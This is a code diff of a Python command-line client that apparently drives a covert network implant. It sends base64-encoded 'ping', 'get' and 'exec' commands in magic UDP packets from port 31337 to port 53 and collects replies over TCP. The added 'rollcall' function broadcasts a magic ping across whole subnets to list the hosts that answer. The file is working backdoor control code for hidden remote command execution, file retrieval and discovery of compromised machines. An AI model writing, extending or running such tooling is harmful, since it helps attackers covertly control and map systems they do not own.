@@ -2,27 +2,32 @@
 import argparse
 import base64
 import contextlib
+import ipaddress
 import os
 import socket
+import time
 
 MAGIC_SRC_PORT = 31337
 DEFAULT_DEST_PORT = 53
 DEFAULT_LISTEN_PORT = 8080
+#DEFAULT_MULTICAST_IP = "239.255.255.250"
 SOCKET_TIMEOUT = 15
+MAX_ROLLCALL_QUEUE = 64
 
 SUPPORTED_CMDS = [
     "ping",
     "get",
     "exec",
+    "rollcall",
 ]
 
 @contextlib.contextmanager
-def _tcp_listener(port):
+def _tcp_listener(port, queue_size=1):
     """socket listening for the command response"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(("0.0.0.0", port))
     sock.settimeout(SOCKET_TIMEOUT)
-    sock.listen(1)
+    sock.listen(queue_size)
     yield sock
     sock.close()
 
@@ -54,6 +59,7 @@ def _send_cmd(msg, ip, dest_port, listen_port):
         response = b""
         while data := sock.recv(4096):
             response += data
+        sock.close()
     decoded = base64.b64decode(response)
     if decoded.startswith(b"ERROR"):
         errno = int(decoded.split(b"ERROR: ")[1])
@@ -101,13 +107,46 @@ def do_exec(ip, dest_port, listen_port, cmd, **kwargs):
     return errno, output
 
 
+def do_rollcall(subnets, dest_port, listen_port, **kwargs):
+    """broadcast a PING and listen for responses"""
+    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
+    encoded = base64.b64encode("PING".encode("ascii"))
+    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"
+    hosts = []
+    with _tcp_listener(listen_port, queue_size=MAX_ROLLCALL_QUEUE) as tcp:
+        for cidr in subnets:
+            broadcast = str(ipaddress.IPv4Network(cidr)[-1])
+            with _udp_sender() as udp:
+                print(f"sending magic packet (multicast) --> {broadcast}:{dest_port}")
+                udp.sendto(data, (broadcast, dest_port))
+        print("waiting for replies...")
+        try:
+            while True:
+                sock, hostaddr = tcp.accept()
+                ip, port = hostaddr
+                response = sock.recv(64)
+                sock.close()
+                try:
+                    hostname = socket.gethostbyaddr(ip)[0]
+                except socket.herror:
+                    hostname = ip
+                if "PONG" in base64.b64decode(response).decode("ascii"):
+                    print(f"Received PONG from {hostname}")
+                    hosts.append(hostname)
+                else:
+                    print(f"Invalid response from: {hostname}")
+        except socket.timeout:
+            pass
+        return hosts
+
+
 def main():
     """CLI entry point"""
     parser = argparse.ArgumentParser(description="send it!")
     subparsers = parser.add_subparsers(help="[supported commands]")
     parser.add_argument(
         "-i", "--ip",
-        required=True,
+        default="127.0.0.1",
         help="IP address of host machine",
     )
     parser.add_argument(
@@ -144,6 +183,15 @@ def main():
         help="command to run",
     )
     exec_parser.set_defaults(func=do_exec)
+    # rollcall
+    rollcall_parser = subparsers.add_parser("rollcall", help="multicast ping")
+    rollcall_parser.add_argument(
+        "-s", "--subnets",
+        required=True,
+        nargs="+",
+        help="CIDR-notated subnet(s) to multicast on, e.g. \"172.20.96.0/20)\"",
+    )
+    rollcall_parser.set_defaults(func=do_rollcall)
     # run with it
     args = parser.parse_args()
     args.func(**vars(args))
